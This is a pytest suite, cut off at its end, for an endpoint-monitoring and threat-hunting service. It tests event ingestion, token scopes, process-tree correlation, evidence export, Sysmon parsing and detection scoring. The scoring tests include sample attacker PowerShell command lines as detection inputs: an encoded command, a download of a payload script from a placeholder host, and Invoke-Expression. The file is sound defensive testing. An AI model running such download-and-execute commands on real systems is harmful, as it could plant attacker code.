import copy
import io
import json
import zipfile

from datetime import (
    datetime,
    timedelta,
    timezone,
)

import pytest

from fastapi.testclient import TestClient

from backend.app import create_app
from backend.services.hunting import assess_event

from agent.buffer import Buffer, BufferFull
from agent.client import Client
from agent.normalize import normalize
from agent.main import flush, collect

from scripts.replay import sample_events
from scripts.verify_evidence import verify


# ============================================================
# Test configuration
# ============================================================

ADMIN = (
    "test-analyst-token-"
    + ("x" * 40)
)

AUTH = {
    "Authorization":
        "Bearer " + ADMIN
}


# ============================================================
# Shared test lab
# ============================================================

@pytest.fixture
def lab(tmp_path):
    app = create_app(
        tmp_path / "server.db",
        ADMIN,
    )

    with TestClient(app) as client:
        enrolled = client.post(
            "/api/v1/endpoints",
            json={
                "hostname":
                    "TEST-PC",

                "platform":
                    "replay",
            },
            headers=AUTH,
        )

        assert (
            enrolled.status_code
            == 201
        )

        endpoint = enrolled.json()

        agent_auth = {
            "Authorization":
                "Bearer "
                + endpoint[
                    "agent_token"
                ]
        }

        yield (
            client,
            endpoint,
            agent_auth,
            app,
        )


def send(
    lab,
    events=None,
):
    client, _, auth, _ = lab

    response = client.post(
        "/api/v1/agent/events",
        json={
            "schema_version": 1,

            "events":
                events
                or sample_events(),
        },
        headers=auth,
    )

    assert (
        response.status_code
        == 200
    ), response.text

    return response.json()


# ============================================================
# Core system / evidence tests
# ============================================================

def test_end_to_end_evidence_and_guid_tree(
    lab,
    tmp_path,
):
    client, _, _, _ = lab

    result = send(lab)

    assert (
        result["inserted"]
        == 7
    )

    assert (
        len(
            result[
                "incident_ids"
            ]
        )
        == 1
    )

    ident = (
        result[
            "incident_ids"
        ][0]
    )

    details = client.get(
        "/api/v1/incidents/"
        + ident,
        headers=AUTH,
    ).json()

    assert (
        details[
            "event_count"
        ]
        == 7
    )

    assert (
        details[
            "window_state"
        ]
        == "collecting"
    )

    tree = client.get(
        "/api/v1/incidents/"
        + ident
        + "/process-tree",
        headers=AUTH,
    ).json()

    assert (
        len(
            tree["nodes"]
        )
        == 4
    )

    assert (
        len(
            tree["edges"]
        )
        == 3
    )

    assert (
        len(
            tree[
                "unresolved_parents"
            ]
        )
        == 1
    )

    evidence = client.get(
        "/api/v1/incidents/"
        + ident
        + "/evidence",
        headers=AUTH,
    )

    path = (
        tmp_path
        / "evidence.zip"
    )

    path.write_bytes(
        evidence.content
    )

    assert verify(path)

    with zipfile.ZipFile(
        io.BytesIO(
            evidence.content
        )
    ) as archive:

        events = json.loads(
            archive.read(
                "events.json"
            )
        )

        assert (
            len(events)
            == 7
        )

    audit = client.get(
        "/api/v1/audit",
        headers=AUTH,
    ).json()

    assert any(
        item["action"]
        == "evidence.export"
        for item in audit
    )


def test_retry_idempotence_survives_restart(
    lab,
):
    client, _, auth, app = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    retry = send(
        lab,
        batch,
    )

    assert (
        retry["inserted"]
        == 0
    )

    assert (
        retry["duplicates"]
        == 7
    )

    assert not retry[
        "incident_ids"
    ]

    with TestClient(
        create_app(
            app.state.database.path,
            ADMIN,
        )
    ) as restarted:

        again = restarted.post(
            "/api/v1/agent/events",
            json={
                "events":
                    batch
            },
            headers=auth,
        ).json()

        assert (
            again[
                "duplicates"
            ]
            == 7
        )

        incidents = restarted.get(
            "/api/v1/incidents",
            headers=AUTH,
        ).json()

        assert (
            len(incidents)
            == 1
        )


def test_conflicting_duplicate_rolls_back_entire_batch(
    lab,
):
    client, endpoint, auth, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    new_event = copy.deepcopy(
        batch[0]
    )

    new_event["event_id"] = (
        "new-event-before-conflict"
    )

    conflicting = copy.deepcopy(
        batch[1]
    )

    conflicting["image"] = (
        "different.exe"
    )

    response = client.post(
        "/api/v1/agent/events",
        json={
            "events": [
                new_event,
                conflicting,
            ]
        },
        headers=auth,
    )

    assert (
        response.status_code
        == 409
    )

    records = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ]
        },
        headers=AUTH,
    ).json()["items"]

    assert (
        len(records)
        == 7
    )


# ============================================================
# Authentication / endpoint security
# ============================================================

def test_scope_revocation_and_secret_redaction(
    lab,
):
    client, endpoint, auth, _ = lab

    assert (
        client.get(
            "/api/v1/endpoints"
        ).status_code
        == 401
    )

    assert (
        client.get(
            "/api/v1/endpoints",
            headers=auth,
        ).status_code
        == 401
    )

    assert (
        client.post(
            "/api/v1/agent/events",
            json={
                "events":
                    sample_events()
            },
            headers=AUTH,
        ).status_code
        == 401
    )

    fleet = client.get(
        "/api/v1/endpoints",
        headers=AUTH,
    ).text

    assert (
        endpoint[
            "agent_token"
        ]
        not in fleet
    )

    assert (
        "token_hash"
        not in fleet
    )

    revoke = client.post(
        "/api/v1/endpoints/"
        + endpoint[
            "endpoint_id"
        ]
        + "/revoke",
        headers=AUTH,
    )

    assert (
        revoke.status_code
        == 200
    )

    assert (
        client.post(
            "/api/v1/agent/events",
            json={
                "events":
                    sample_events()
            },
            headers=auth,
        ).status_code
        == 401
    )


def test_device_identity_cannot_be_spoofed_in_payload(
    lab,
):
    client, _, auth, _ = lab

    response = client.post(
        "/api/v1/agent/events",
        json={
            "events":
                sample_events(),

            "endpoint_id":
                "someone-else",
        },
        headers=auth,
    )

    assert (
        response.status_code
        == 422
    )


# ============================================================
# Process correlation
# ============================================================

def test_out_of_order_events_and_pid_reuse(
    lab,
):
    client, _, _, _ = lab

    batch = sample_events()

    trigger = send(
        lab,
        [
            batch[2]
        ],
    )["incident_ids"][0]

    send(
        lab,
        [
            batch[1],
            batch[0],
            *batch[3:],
        ],
    )

    # Same PID, unrelated GUID must not become the parent.
    other = copy.deepcopy(
        batch[0]
    )

    other["event_id"] = (
        "unrelated-process-id"
    )

    other["process_guid"] = (
        "{unrelated}"
    )

    other["parent_guid"] = None

    other["process_id"] = 4280

    send(
        lab,
        [other],
    )

    tree = client.get(
        "/api/v1/incidents/"
        + trigger
        + "/process-tree",
        headers=AUTH,
    ).json()

    assert (
        len(
            tree["edges"]
        )
        == 3
    )

    assert not any(
        edge["parent"]
        == "{unrelated}"
        for edge in tree[
            "edges"
        ]
    )


def test_different_endpoints_do_not_cross_correlate(
    lab,
):
    client, _, _, _ = lab

    batch = sample_events()

    ident = send(
        lab,
        [
            batch[2]
        ],
    )["incident_ids"][0]

    second = client.post(
        "/api/v1/endpoints",
        json={
            "hostname":
                "OTHER",

            "platform":
                "replay",
        },
        headers=AUTH,
    ).json()

    client.post(
        "/api/v1/agent/events",
        json={
            "events": [
                batch[1]
            ]
        },
        headers={
            "Authorization":
                "Bearer "
                + second[
                    "agent_token"
                ]
        },
    )

    tree = client.get(
        "/api/v1/incidents/"
        + ident
        + "/process-tree",
        headers=AUTH,
    ).json()

    assert (
        tree["edges"]
        == []
    )

    assert (
        len(
            tree[
                "unresolved_parents"
            ]
        )
        == 1
    )


# ============================================================
# Validation / request controls
# ============================================================

def test_clock_and_schema_validation(
    lab,
):
    client, _, auth, _ = lab

    event = sample_events()[0]

    event["timestamp"] = (
        "2026-01-01T10:00:00"
    )

    assert (
        client.post(
            "/api/v1/agent/events",
            json={
                "events": [
                    event
                ]
            },
            headers=auth,
        ).status_code
        == 422
    )

    event["timestamp"] = (
        datetime.now(
            timezone.utc
        )
        + timedelta(
            hours=1
        )
    ).isoformat()

    assert (
        client.post(
            "/api/v1/agent/events",
            json={
                "events": [
                    event
                ]
            },
            headers=auth,
        ).status_code
        == 422
    )

    assert (
        client.post(
            "/api/v1/agent/events",
            json={
                "events": []
            },
            headers=auth,
        ).status_code
        == 422
    )


def test_request_size_limit(
    lab,
):
    client, _, auth, _ = lab

    payload = (
        b"x"
        * (
            2
            * 1024
            * 1024
            + 1
        )
    )

    response = client.post(
        "/api/v1/agent/events",
        content=payload,
        headers=auth,
    )

    assert (
        response.status_code
        == 413
    )


# ============================================================
# Existing filtering / incident disposition
# ============================================================

def test_filters_disposition_and_audit(
    lab,
):
    client, endpoint, _, _ = lab

    ident = send(
        lab
    )["incident_ids"][0]

    rows = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "category":
                "network",

            "q":
                "203.0.113.42",
        },
        headers=AUTH,
    ).json()["items"]

    assert (
        len(rows)
        == 1
    )

    response = client.patch(
        "/api/v1/incidents/"
        + ident,
        json={
            "status":
                "resolved",

            "note":
                "Reviewed synthetic replay",
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    details = client.get(
        "/api/v1/incidents/"
        + ident,
        headers=AUTH,
    ).json()

    assert (
        details["status"]
        == "resolved"
    )

    assert (
        client.get(
            "/api/v1/incidents/missing",
            headers=AUTH,
        ).status_code
        == 404
    )


def test_benign_powershell_does_not_match(
    lab,
):
    event = copy.deepcopy(
        sample_events()[2]
    )

    event["parent_image"] = (
        r"C:\Windows\explorer.exe"
    )

    result = send(
        lab,
        [event],
    )

    assert (
        result[
            "incident_ids"
        ]
        == []
    )


# ============================================================
# Milestone 6E
# Threat Hunting API tests
# ============================================================

def test_hunting_cross_endpoint_search(
    lab,
):
    client, endpoint, _, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    second_response = client.post(
        "/api/v1/endpoints",
        json={
            "hostname":
                "SECOND-PC",

            "platform":
                "replay",
        },
        headers=AUTH,
    )

    assert (
        second_response.status_code
        == 201
    )

    second = (
        second_response.json()
    )

    second_event = copy.deepcopy(
        batch[0]
    )

    second_event["event_id"] = (
        "second-endpoint-event"
    )

    response = client.post(
        "/api/v1/agent/events",
        json={
            "events": [
                second_event
            ]
        },
        headers={
            "Authorization":
                "Bearer "
                + second[
                    "agent_token"
                ]
        },
    )

    assert (
        response.status_code
        == 200
    )

    result = client.get(
        "/api/v1/events",
        params={
            "order":
                "asc",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        result.status_code
        == 200
    )

    data = result.json()

    assert (
        data["total"]
        == 8
    )

    endpoint_ids = {
        event[
            "endpoint_id"
        ]
        for event
        in data["items"]
    }

    assert (
        endpoint[
            "endpoint_id"
        ]
        in endpoint_ids
    )

    assert (
        second[
            "endpoint_id"
        ]
        in endpoint_ids
    )


def test_hunting_endpoint_filter(
    lab,
):
    client, endpoint, _, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    second = client.post(
        "/api/v1/endpoints",
        json={
            "hostname":
                "SECOND-PC",

            "platform":
                "replay",
        },
        headers=AUTH,
    ).json()

    second_event = copy.deepcopy(
        batch[0]
    )

    second_event["event_id"] = (
        "second-endpoint-filter-event"
    )

    client.post(
        "/api/v1/agent/events",
        json={
            "events": [
                second_event
            ]
        },
        headers={
            "Authorization":
                "Bearer "
                + second[
                    "agent_token"
                ]
        },
    )

    result = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "limit":
                100,
        },
        headers=AUTH,
    ).json()

    assert (
        result["total"]
        == 7
    )

    assert all(
        event[
            "endpoint_id"
        ]
        == endpoint[
            "endpoint_id"
        ]
        for event
        in result["items"]
    )


def test_hunting_source_filtering(
    lab,
):
    client, endpoint, auth, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    endpoint_event = copy.deepcopy(
        batch[0]
    )

    endpoint_event["event_id"] = (
        "real-endpoint-event"
    )

    endpoint_event["synthetic"] = (
        False
    )

    response = client.post(
        "/api/v1/agent/events",
        json={
            "events": [
                endpoint_event
            ]
        },
        headers=auth,
    )

    assert (
        response.status_code
        == 200
    )

    replay = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "source":
                "replay",

            "limit":
                100,
        },
        headers=AUTH,
    ).json()

    endpoint_only = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "source":
                "endpoint",

            "limit":
                100,
        },
        headers=AUTH,
    ).json()

    assert (
        replay["total"]
        == 7
    )

    assert (
        endpoint_only[
            "total"
        ]
        == 1
    )

    assert all(
        event.get(
            "synthetic"
        ) is True
        for event
        in replay["items"]
    )

    assert all(
        event.get(
            "synthetic"
        ) is False
        for event
        in endpoint_only[
            "items"
        ]
    )


def test_hunting_category_filter(
    lab,
):
    client, endpoint, _, _ = lab

    send(lab)

    result = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "category":
                "network",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        result.status_code
        == 200
    )

    data = result.json()

    assert (
        data["total"]
        >= 1
    )

    assert all(
        event["category"]
        == "network"
        for event
        in data["items"]
    )


def test_hunting_free_text_search(
    lab,
):
    client, endpoint, _, _ = lab

    send(lab)

    result = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "q":
                "powershell",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        result.status_code
        == 200
    )

    data = result.json()

    assert (
        data["total"]
        >= 1
    )

    assert any(
        "powershell"
        in json.dumps(
            event
        ).lower()
        for event
        in data["items"]
    )


def test_hunting_exact_event_id(
    lab,
):
    client, _, _, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    target = batch[2]

    response = client.get(
        "/api/v1/events",
        params={
            "event_id":
                target[
                    "event_id"
                ]
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    data = response.json()

    assert (
        data["total"]
        == 1
    )

    assert (
        data["items"][0][
            "event_id"
        ]
        == target[
            "event_id"
        ]
    )


def test_hunting_process_guid_filter(
    lab,
):
    client, endpoint, _, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    guid = (
        batch[2][
            "process_guid"
        ]
    )

    response = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "process_guid":
                guid,

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    data = response.json()

    assert (
        data["total"]
        >= 1
    )

    assert all(
        event[
            "process_guid"
        ]
        == guid
        for event
        in data["items"]
    )


def test_hunting_ordering(
    lab,
):
    client, endpoint, _, _ = lab

    send(lab)

    ascending = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "order":
                "asc",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        ascending.status_code
        == 200
    )

    ascending = ascending.json()

    asc_pairs = [
        (
            datetime.fromisoformat(
                event[
                    "timestamp"
                ]
            ),

            str(
                event[
                    "event_id"
                ]
            ),
        )

        for event
        in ascending["items"]
    ]

    assert (
        asc_pairs
        == sorted(
            asc_pairs
        )
    )

    descending = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "order":
                "desc",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        descending.status_code
        == 200
    )

    descending = (
        descending.json()
    )

    desc_pairs = [
        (
            datetime.fromisoformat(
                event[
                    "timestamp"
                ]
            ),

            str(
                event[
                    "event_id"
                ]
            ),
        )

        for event
        in descending["items"]
    ]

    assert (
        desc_pairs
        == sorted(
            desc_pairs,
            reverse=True,
        )
    )


def test_hunting_time_range(
    lab,
):
    client, endpoint, _, _ = lab

    send(lab)

    all_events = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "order":
                "asc",

            "limit":
                100,
        },
        headers=AUTH,
    ).json()

    assert (
        all_events["total"]
        == 7
    )

    start = (
        all_events[
            "items"
        ][1]["timestamp"]
    )

    end = (
        all_events[
            "items"
        ][-2]["timestamp"]
    )

    response = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "start_time":
                start,

            "end_time":
                end,

            "order":
                "asc",

            "limit":
                100,
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    data = response.json()

    start_dt = (
        datetime.fromisoformat(
            start
        )
    )

    end_dt = (
        datetime.fromisoformat(
            end
        )
    )

    assert (
        data["total"]
        >= 1
    )

    assert all(
        start_dt
        <= datetime.fromisoformat(
            event["timestamp"]
        )
        <= end_dt
        for event
        in data["items"]
    )


def test_hunting_invalid_time_range(
    lab,
):
    client, _, _, _ = lab

    response = client.get(
        "/api/v1/events",
        params={
            "start_time":
                (
                    "2026-09-15"
                    "T12:00:00+00:00"
                ),

            "end_time":
                (
                    "2026-09-15"
                    "T11:00:00+00:00"
                ),
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 422
    )

    assert (
        "start_time"
        in response.text
    )


def test_hunting_pagination_metadata(
    lab,
):
    client, endpoint, _, _ = lab

    send(lab)

    first = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "limit":
                2,

            "offset":
                0,

            "order":
                "asc",
        },
        headers=AUTH,
    )

    assert (
        first.status_code
        == 200
    )

    first = first.json()

    assert (
        first["total"]
        == 7
    )

    assert (
        len(
            first["items"]
        )
        == 2
    )

    assert (
        first["has_more"]
        is True
    )

    assert (
        first["offset"]
        == 0
    )

    assert (
        first["limit"]
        == 2
    )

    final = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "limit":
                2,

            "offset":
                6,

            "order":
                "asc",
        },
        headers=AUTH,
    )

    assert (
        final.status_code
        == 200
    )

    final = final.json()

    assert (
        final["total"]
        == 7
    )

    assert (
        len(
            final["items"]
        )
        == 1
    )

    assert (
        final["has_more"]
        is False
    )


# ============================================================
# Milestone 6E
# Hunting API enrichment
# ============================================================

def test_api_office_powershell_is_high_signal(
    lab,
):
    client, endpoint, _, _ = lab

    batch = sample_events()

    send(
        lab,
        batch,
    )

    trigger = batch[2]

    response = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "event_id":
                trigger[
                    "event_id"
                ],
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    data = response.json()

    assert (
        data["total"]
        == 1
    )

    hunting = (
        data["items"][0][
            "hunting"
        ]
    )

    assert (
        hunting["level"]
        == "high_signal"
    )

    assert (
        hunting["label"]
        == "High signal"
    )

    assert (
        hunting["score"]
        >= 70
    )

    signal_ids = {
        signal["id"]

        for signal
        in hunting["signals"]
    }

    assert (
        "office_to_shell"
        in signal_ids
    )


def test_api_normal_powershell_is_context_only(
    lab,
):
    client, endpoint, _, _ = lab

    event = copy.deepcopy(
        sample_events()[2]
    )

    event["event_id"] = (
        "normal-powershell-event"
    )

    event["parent_image"] = (
        r"C:\Windows\explorer.exe"
    )

    event["parent_guid"] = None

    event["synthetic"] = False

    result = send(
        lab,
        [event],
    )

    assert (
        result[
            "incident_ids"
        ]
        == []
    )

    response = client.get(
        "/api/v1/events",
        params={
            "endpoint_id":
                endpoint[
                    "endpoint_id"
                ],

            "event_id":
                event[
                    "event_id"
                ],
        },
        headers=AUTH,
    )

    assert (
        response.status_code
        == 200
    )

    data = response.json()

    assert (
        data["total"]
        == 1
    )

    hunting = (
        data["items"][0][
            "hunting"
        ]
    )

    assert (
        hunting["level"]
        == "context_only"
    )

    assert (
        hunting["score"]
        == 0
    )

    assert (
        hunting["signals"]
        == []
    )


# ============================================================
# Milestone 6E
# Hunting heuristic unit tests
# ============================================================

def test_hunting_normal_powershell_context_only():
    event = {
        "category":
            "process",

        "image":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "parent_image":
            r"C:\Windows\explorer.exe",

        "command_line":
            (
                "powershell.exe "
                "-NoProfile "
                "-NonInteractive "
                "-File C:\\Lab\\inventory.ps1"
            ),
    }

    result = assess_event(
        event
    )

    assert (
        result["level"]
        == "context_only"
    )

    assert (
        result["score"]
        == 0
    )

    assert (
        result["signals"]
        == []
    )


def test_hunting_office_powershell_high_signal():
    event = {
        "category":
            "process",

        "image":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "parent_image":
            (
                r"C:\Program Files"
                r"\Microsoft Office"
                r"\root\Office16"
                r"\WINWORD.EXE"
            ),

        "command_line":
            (
                "powershell.exe "
                "-NoProfile "
                "-File C:\\Lab\\inventory.ps1"
            ),
    }

    result = assess_event(
        event
    )

    assert (
        result["level"]
        == "high_signal"
    )

    assert (
        result["score"]
        >= 70
    )

    assert any(
        signal["id"]
        == "office_to_shell"

        for signal
        in result[
            "signals"
        ]
    )


@pytest.mark.parametrize(
    "command,expected_signal",
    [
        (
            (
                "powershell.exe "
                "-EncodedCommand "
                "SQBFAFgAIAAoACcAdABlAHMAdAAnACkA"
            ),
            "encoded_powershell",
        ),

        (
            (
                "powershell.exe "
                "-Command "
                "\"Invoke-WebRequest "
                "https://example.test/payload.ps1 "
                "-OutFile C:\\Temp\\payload.ps1\""
            ),
            "powershell_download",
        ),
    ],
)
def test_hunting_powershell_patterns_need_review(
    command,
    expected_signal,
):
    event = {
        "category":
            "process",

        "image":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "parent_image":
            r"C:\Windows\explorer.exe",

        "command_line":
            command,
    }

    result = assess_event(
        event
    )

    assert (
        result["level"]
        == "needs_review"
    )

    assert (
        result["score"]
        >= 30
    )

    assert any(
        signal["id"]
        == expected_signal

        for signal
        in result[
            "signals"
        ]
    )


def test_hunting_dynamic_execution_needs_review():
    event = {
        "category":
            "process",

        "image":
            r"C:\Windows\powershell.exe",

        "parent_image":
            r"C:\Windows\explorer.exe",

        "command_line":
            (
                "powershell.exe "
                "-Command "
                "\"Invoke-Expression $command\""
            ),
    }

    result = assess_event(
        event
    )

    assert (
        result["level"]
        == "needs_review"
    )

    signal_ids = {
        signal["id"]
        for signal
        in result["signals"]
    }

    assert (
        "powershell_dynamic_execution"
        in signal_ids
    )


def test_hunting_user_writable_execution_needs_review():
    event = {
        "category":
            "process",

        "image":
            (
                r"C:\Users\analyst"
                r"\AppData\Local\Temp"
                r"\tool.exe"
            ),

        "parent_image":
            r"C:\Windows\explorer.exe",

        "command_line":
            (
                r"C:\Users\analyst"
                r"\AppData\Local\Temp"
                r"\tool.exe"
            ),
    }

    result = assess_event(
        event
    )

    signal_ids = {
        signal["id"]
        for signal
        in result["signals"]
    }

    assert (
        "user_writable_execution"
        in signal_ids
    )

    assert (
        result["score"]
        >= 30
    )

    assert (
        result["level"]
        == "needs_review"
    )


def test_hunting_shell_network_signal():
    event = {
        "category":
            "network",

        "image":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "target":
            "203.0.113.42:443",
    }

    result = assess_event(
        event
    )

    signal_ids = {
        signal["id"]
        for signal
        in result["signals"]
    }

    assert (
        "shell_network"
        in signal_ids
    )

    assert (
        result["score"]
        == 25
    )

    # Current hunting policy:
    # Needs review begins at score 30.
    assert (
        result["level"]
        == "context_only"
    )


def test_hunting_shell_dns_signal():
    event = {
        "category":
            "dns",

        "image":
            (
                r"C:\Windows\System32"
                r"\WindowsPowerShell\v1.0"
                r"\powershell.exe"
            ),

        "target":
            "example.test",
    }

    result = assess_event(
        event
    )

    signal_ids = {
        signal["id"]
        for signal
        in result["signals"]
    }

    assert (
        "shell_dns"
        in signal_ids
    )

    assert (
        result["score"]
        == 20
    )

    assert (
        result["level"]
        == "context_only"
    )


def test_hunting_score_is_capped_at_100():
    event = {
        "category":
            "process",

        "image":
            (
                r"C:\Users\analyst"
                r"\AppData\Local\Temp"
                r"\powershell.exe"
            ),

        "parent_image":
            (
                r"C:\Program Files"
                r"\Microsoft Office"
                r"\root\Office16"
                r"\WINWORD.EXE"
            ),

        "command_line":
            (
                "powershell.exe "
                "-EncodedCommand AAAA "
                "Invoke-Expression "
                "Invoke-WebRequest "
                "https://example.test/payload"
            ),
    }

    result = assess_event(
        event
    )

    assert (
        result["score"]
        == 100
    )

    assert (
        result["level"]
        == "high_signal"
    )

    assert (
        len(
            result["signals"]
        )
        >= 3
    )


# ============================================================
# Buffer persistence / reliability
# ============================================================

def test_buffer_restart_acknowledgement_and_pin(
    tmp_path,
):
    path = (
        tmp_path
        / "buffer.db"
    )

    batch = sample_events(
        datetime.now(
            timezone.utc
        )
        - timedelta(
            hours=2
        )
    )

    buffer = Buffer(
        path
    )

    buffer.append(
        batch,
        7,
    )

    buffer.close()

    buffer = Buffer(
        path
    )

    assert (
        len(
            buffer.pending()
        )
        == 7
    )

    assert (
        buffer.get(
            "record_id"
        )
        == "7"
    )

    buffer.acknowledge(
        [
            event["event_id"]
            for event in batch
        ]
    )

    # All fall within the locally pinned incident window.
    assert (
        buffer.prune()
        == 0
    )

    assert not buffer.pending()

    assert (
        buffer.counts()[
            "buffer_events"
        ]
        == 7
    )

    buffer.close()


def test_buffer_overflow_is_atomic(
    tmp_path,
):
    buffer = Buffer(
        tmp_path
        / "buffer.db",
        max_events=2,
    )

    with pytest.raises(
        BufferFull
    ):
        buffer.append(
            sample_events()[:3],
            3,
            {
                "anchor":
                    "must-not-commit"
            },
        )

    assert (
        buffer.counts()[
            "buffer_events"
        ]
        == 0
    )

    assert (
        buffer.get(
            "record_id"
        )
        is None
    )

    assert (
        buffer.get(
            "anchor"
        )
        is None
    )

    buffer.close()


def test_buffer_byte_budget(
    tmp_path,
):
    buffer = Buffer(
        tmp_path
        / "buffer.db",
        max_bytes=10,
    )

    with pytest.raises(
        BufferFull
    ):
        buffer.append(
            sample_events()[:1],
            1,
        )

    assert (
        buffer.counts()[
            "buffer_events"
        ]
        == 0
    )

    buffer.close()


def test_unsent_events_never_pruned(
    tmp_path,
):
    buffer = Buffer(
        tmp_path
        / "buffer.db"
    )

    event = sample_events(
        datetime.now(
            timezone.utc
        )
        - timedelta(
            days=1
        )
    )[0]

    buffer.append(
        [event]
    )

    assert (
        buffer.prune()
        == 0
    )

    buffer.acknowledge(
        [
            event["event_id"]
        ]
    )

    assert (
        buffer.prune()
        == 1
    )

    buffer.close()


def test_transport_failure_retains_queue(
    tmp_path,
):
    buffer = Buffer(
        tmp_path
        / "buffer.db"
    )

    buffer.append(
        sample_events()
    )

    class Failing:
        def request(
            self,
            *args,
        ):
            raise OSError(
                "offline"
            )

    with pytest.raises(
        OSError
    ):
        flush(
            buffer,
            Failing(),
        )

    assert (
        buffer.counts()[
            "queued_events"
        ]
        == 7
    )

    class BadAck:
        def request(
            self,
            *args,
        ):
            return {
                "accepted_ids":
                    []
            }

    with pytest.raises(
        RuntimeError
    ):
        flush(
            buffer,
            BadAck(),
        )

    assert (
        buffer.counts()[
            "queued_events"
        ]
        == 7
    )

    buffer.close()


# ============================================================
# Sysmon normalization
# ============================================================

def sysmon_xml(
    kind=1,
    record=42,
):
    return f"""
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System>
<Provider Name="Microsoft-Windows-Sysmon"/>
<EventID>{kind}</EventID>
<TimeCreated SystemTime="2026-09-11T10:42:16.1234567Z"/>
<EventRecordID>{record}</EventRecordID>
</System>
<EventData>
<Data Name="Image">C:\\Windows\\powershell.exe</Data>
<Data Name="ProcessGuid">{{ABC}}</Data>
<Data Name="ParentProcessGuid">{{DEF}}</Data>
<Data Name="ProcessId">1234</Data>
<Data Name="ParentImage">C:\\Office\\WINWORD.EXE</Data>
<Data Name="QueryName">example.test</Data>
<Data Name="DestinationIp">203.0.113.42</Data>
<Data Name="DestinationPort">443</Data>
<Data Name="TargetFilename">C:\\Lab\\test.txt</Data>
</EventData>
</Event>
"""


@pytest.mark.parametrize(
    "kind,category",
    [
        (
            1,
            "process",
        ),
        (
            3,
            "network",
        ),
        (
            11,
            "file",
        ),
        (
            22,
            "dns",
        ),
    ],
)
def test_sysmon_normalization(
    kind,
    category,
):
    value = normalize(
        sysmon_xml(
            kind
        ),
        "epoch-a",
    )

    assert (
        value["category"]
        == category
    )

    assert (
        value[
            "process_guid"
        ]
        == "{abc}"
    )

    again = normalize(
        sysmon_xml(
            kind
        ),
        "epoch-a",
    )

    different_epoch = normalize(
        sysmon_xml(
            kind
        ),
        "epoch-b",
    )

    assert (
        value["event_id"]
        == again[
            "event_id"
        ]
    )

    assert (
        value["event_id"]
        != different_epoch[
            "event_id"
        ]
    )


@pytest.mark.parametrize(
    "xml",
    [
        "<!DOCTYPE foo><Event/>",

        "<bad",

        sysmon_xml().replace(
            "Microsoft-Windows-Sysmon",
            "Other",
        ),
    ],
)
def test_invalid_xml_rejected(
    xml,
):
    with pytest.raises(
        Exception
    ):
        normalize(
            xml,
            "epoch",
        )


# ============================================================
# Collector behavior
# ============================================================

def test_collector_checkpoint_and_reset(
    tmp_path,
    monkeypatch,
):
    import agent.main as main

    buffer = Buffer(
        tmp_path
        / "buffer.db"
    )

    class Result:
        stdout = json.dumps(
            {
                "Oldest":
                    1,

                "Latest":
                    42,

                "Anchor":
                    None,

                "Events": [
                    sysmon_xml()
                ],
            }
        )

    monkeypatch.setattr(
        main.subprocess,
        "run",
        lambda *args, **kwargs:
            Result(),
    )

    collect(
        buffer
    )

    assert (
        buffer.get(
            "record_id"
        )
        == "42"
    )

    assert (
        len(
            buffer.pending()
        )
        == 1
    )

    old_epoch = buffer.get(
        "epoch"
    )

    Result.stdout = json.dumps(
        {
            "Oldest":
                1,

            "Latest":
                2,

            "Anchor":
                None,

            "Events":
                [],
        }
    )

    collect(
        buffer
    )

    assert (
        buffer.get(
            "record_id"
        )
        == "0"
    )

    assert (
        buffer.get(
            "epoch"
        )
        != old_epoch
    )

    assert any(
        event["category"]
        == "health"

        for event
        in buffer.pending()
    )

    buffer.close()


def test_collector_rollover_records_gap(
    tmp_path,
    monkeypatch,
):
